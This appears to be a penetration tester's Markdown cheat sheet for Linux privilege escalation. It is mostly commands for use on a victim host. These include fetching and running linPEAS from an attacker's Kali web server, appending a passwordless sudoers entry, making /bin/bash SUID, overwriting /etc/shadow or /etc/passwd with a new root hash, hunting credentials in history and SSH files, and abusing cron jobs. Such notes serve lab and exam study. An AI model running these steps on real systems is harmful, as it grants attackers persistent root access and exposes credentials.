## Intro
Use Linpeas if possible

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
Alternative enumeration script: https://github.com/diego-treitos/linux-smart-enumeration/tree/master

On the attacker host:
```
# determine IP address of Kali
ip a

# create python webserver in the directory where linpeass are located
python -m http.server 8080
```
From the victim host
```

#Either of the below
wget http://<KALI IP>:8080/linpeas.sh
curl --output linpeas.sh http://<KALI IP>:8080/linpeas.sh

chmod +x linpeas.sh
./linpeas.sh
```
## Quick privesc
If you can execute as root, below is a simple onliner to get permanent privesc
```
# Add any other user to sudoers
echo '<username> ALL=(ALL) NOPASSWD:ALL' >> /mnt/root/etc/sudoers

# make bash SUID
chmod u+s /bin/bash
```

## Basic
Check if you can become root without password
```
su root
```

Check what priviliges you have (what can be run as sudo without password)

Compare with the list here: https://gtfobins.github.io/#+sudo

Also check which environment variables are inherited (look for the env_keep options)
```
sudo -l
```
## Processes
Look for anything out of the ordinary
```
ps -ef
```
## Groups
List user groups (permissions)
```
id
# OR
groups
```
Look for anything outside of standard user groups.
To get more info about specific group use
```
# get group basic info
grep <groupname> /etc/group

# To see everything a group owns:
find / -group <groupname> 2>/dev/null
```

## Interesting binaries
If there is any interesting binary (e.g suid or sudo) check ot how to exploit it here:\
https://gtfobins.github.io/

## passwd and shadow

Check if you can read/write /etc/shadow.
- Can Write -> replace root password
- Can Read -> crack the passwords
```
ls -l /etc/shadow

# Generate new password hash to overwrite /etc/shadow
mkpasswd -m sha-512 test
```

Check if you can write to /etc/passwd
- Can write -> add root password directly here
```
ls -l /etc/passwd

# Generate new password hash to overwrite /etc/passwd
openssl passwd test
```

## Crontab
Check what is executed in cron
- edit the .sh files if possible
  - maybe they include wildcards (*) that can be abused? 
- replace executable files\
- check location of the PATH variable, can you do search order hijacking?
```
cat /etc/crontab
```

## SUID file
Executables that are executed in the context of root user.
Find all SUID files and look for the weird ones (e.g. in the user dir)

List of all commonly exploited SUID binaries: https://gtfobins.github.io/#+suid
```
find / -type f -perm -u=s 2>/dev/null
# or
find / -user root -perm -4000 -print 2>/dev/null
```
## history, Passwords & keys
Maybe password is available in any log or config file?
```
# User history
history
cat ~/.*history

# SSH config files (must be readable)
find / -name ".ssh" 2>/dev/null
```

## Services & listening ports
```
# show the port
ss -tln

#show the name
ss -tl
```

## Find exploits
https://www.exploit-db.com/
- Exploits for SUID executables

https://github.com/jondonas/linux-exploit-suggester-2
- Exploits for the Linux itself

## Additional materials
https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
